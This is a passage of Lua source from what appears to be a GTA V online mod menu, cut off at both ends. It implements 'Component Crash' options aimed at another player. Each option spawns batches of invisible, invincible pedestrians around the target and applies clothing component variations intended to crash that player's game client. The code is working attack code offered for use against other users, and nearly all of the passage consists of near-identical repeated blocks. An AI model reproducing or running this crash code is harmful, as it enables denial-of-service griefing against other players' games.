            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds11 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds11[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_josh")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds12 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds12[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lamardavis")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds13 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds13[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lestercrest")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds14 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds14[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lestercrest_3")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds15 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds15[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_martinmadrazo")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds16 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds16[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_milton")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds17 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds17[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_molly")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds18 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds18[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_mrs_thornhill")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds19 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds19[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_nigel")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds20 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds20[i])
                util.yield(5)					
            end
            util.yield(100)
            util.toast("Done")
        else
            util.toast("You can't use it on yourself")
        end
end)

    menu.toggle_loop(clothescrash, "Component Crash V2", {"compcrashv2"}, "Warning! Toggle Panic Mode First!", function(on_toggle)
            local math_random = math.random
            local joaat = util.joaat
            util.yield(100)
            local pedhash = util.joaat("s_m_y_blackops_03")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds1 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(50)
            for i = 1, ped_amount do
                --entities.delete(SpawnedPeds1[i])
                util.yield(5)
            ----------------------------------------------------------------------------
                local pedhash = util.joaat("a_f_y_juggalo_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("g_m_y_ballasout_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("u_m_m_markfost")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("a_m_y_gay_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
